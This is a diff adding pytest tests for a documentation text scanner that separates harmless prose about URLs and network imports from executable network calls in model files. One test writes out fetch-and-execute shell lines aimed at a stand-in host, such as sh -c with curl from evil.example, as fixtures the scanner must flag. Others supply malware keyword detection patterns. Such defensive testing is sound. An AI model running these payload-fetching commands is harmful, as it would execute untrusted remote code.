@@ -1,4 +1,5 @@
 from pathlib import Path
+from typing import Any
 
 import pytest
 
@@ -64,6 +65,27 @@ def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> No
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
+@pytest.mark.parametrize(
+    "content",
+    [
+        "Project URL: https://example.com/project\n",
+        "Dataset URL: https://example.com/dataset\n",
+    ],
+)
+def test_text_scanner_generic_documentation_url_labels_are_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
 def test_text_scanner_documentation_network_api_prose_is_informational(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text("Use requests.get to download weights.\n", encoding="utf-8")
@@ -99,6 +121,155 @@ def test_text_scanner_later_network_api_call_is_not_hidden_by_prose(tmp_path: Pa
         and check.severity == IssueSeverity.CRITICAL
         for check in result.checks
     )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_documentation_network_library_prose_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("To use it, import requests before downloading weights.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "requests"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_later_network_library_import_is_not_hidden_by_prose(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "To use it, import requests before downloading weights.\nimport requests\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "requests"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'requests.request("GET", endpoint)\n',
+        'if enabled: requests.request("GET", endpoint)\n',
+        "if enabled: import requests\n",
+        "for _ in [0]: import socket  # examples\n",
+        "match mode: case _: import socket\n",
+        "async for item in stream: import socket\n",
+        "x = 1; import requests\n",
+        "setup(); import requests\n",
+        "if enabled: pass; import requests\n",
+        "async def load(): import socket\n",
+        "executor.submit(requests.request, 'GET', endpoint)\n",
+        'socket.request("/")\n',
+    ],
+)
+def test_text_scanner_executable_network_library_usage_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_semicolon_prose_network_import_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "For example; import socket for troubleshooting.\nFor example: import requests before use.\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_later_compound_network_import_is_not_hidden_by_prose(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "To use it, import requests before downloading weights.\nif enabled: import requests\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        'requests.request("GET", endpoint)\nTo use it, import requests before downloading weights.\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("pattern") == "requests.request"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'sh -c "$(curl https://evil.example/payload)"\n',
+        "$(wget https://evil.example/payload)\n",
+        "`curl https://evil.example/payload`\n",
+        'echo "$(curl https://evil.example/payload)"\n',
+    ],
+)
+def test_text_scanner_documentation_shell_substitution_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 1
 
 
@@ -343,6 +514,39 @@ def test_text_scanner_standard_requirements_urls_are_informational(
     assert determine_exit_code(aggregate) == 0
 
 
+def test_text_scanner_commented_requirements_url_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "requirements.txt"
+    text_path.write_text("# --index-url https://pypi.org/simple\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        b"endpoint-prod_v2: ",
+        b"<endpoint-prod:v2>",
+    ],
+)
+def test_text_scanner_bounded_endpoint_suffixes_remain_code_shaped(prefix: bytes) -> None:
+    assert TextScanner._documentation_line_is_code_shaped(prefix, len(prefix))
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        b"\turl-" + b"--" * 128,
+        b"<url-" + b"--" * 128,
+    ],
+)
+def test_text_scanner_malformed_generic_url_labels_are_not_code_shaped(prefix: bytes) -> None:
+    assert not TextScanner._documentation_line_is_code_shaped(prefix, len(prefix))
+
+
 @pytest.mark.parametrize(
     "requirement_line",
     [
@@ -560,6 +764,81 @@ def test_text_scanner_documentation_code_url_after_limit_fails_closed(tmp_path: 
     assert result.success is False
     assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
     assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
+
+
+def test_text_scanner_documentation_classification_limit_is_inconclusive(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("No malware is present.\n" * 1_025, encoding="utf-8")
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+    aggregate = scan_model_directory_or_file(
+        str(text_path),
+        config={"check_secrets": False},
+        cache_enabled=False,
+    )
+
+    assert result.success is False
+    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata.get("operational_error_reason") == "text_content_security_classification_limit"
+    assert determine_exit_code(aggregate) == 2
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert any(
+        check.name == "Text Content Security Coverage"
+        and check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
+        and check.details.get("max_classification_occurrences") == 1_024
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_classification_exact_limit_is_complete(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("No malware is present.\n" * 1_024, encoding="utf-8")
+
+    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
+
+    assert result.success is True
+    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
+    assert not any(
+        check.details.get("scan_outcome_reason") == "text_content_security_classification_limit"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_documentation_classification_exact_limit_ignores_passive_followups() -> None:
+    payload = b"No malware is present.\n" * 1_024
+    findings = [
+        {"type": "cc_pattern", "pattern": "malware", "severity": "HIGH", "position": 3},
+        {
+            "type": "url_detected",
+            "url": "https://example.com/project",
+            "severity": "MEDIUM",
+            "position": len(payload),
+        },
+    ]
+
+    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, findings)
+
+    assert incomplete is False
+
+
+def test_text_scanner_documentation_classification_limit_is_shared(monkeypatch: pytest.MonkeyPatch) -> None:
+    patterns = ["malware", "backdoor", "trojan", "botnet", "zombie"]
+    payload = (" ".join(f"no {pattern}" for pattern in patterns) + "\n").encode() * 1_025
+    findings = [{"type": "cc_pattern", "pattern": pattern, "severity": "HIGH", "position": 0} for pattern in patterns]
+    checks = 0
+    original = TextScanner._documentation_cc_finding_is_benign_prose
+
+    def count_checks(cls: type[TextScanner], data: bytes, finding: dict[str, Any]) -> bool:
+        nonlocal checks
+        checks += 1
+        return original(data, finding)
+
+    monkeypatch.setattr(TextScanner, "_documentation_cc_finding_is_benign_prose", classmethod(count_checks))
+
+    _classified, incomplete = TextScanner._downgrade_sidecar_network_findings("README.md", payload, findings)
+
+    assert incomplete is True
+    assert checks == 1_024
 
 
 def test_text_scanner_passive_vocabulary_network_limit_is_informational(tmp_path: Path) -> None:
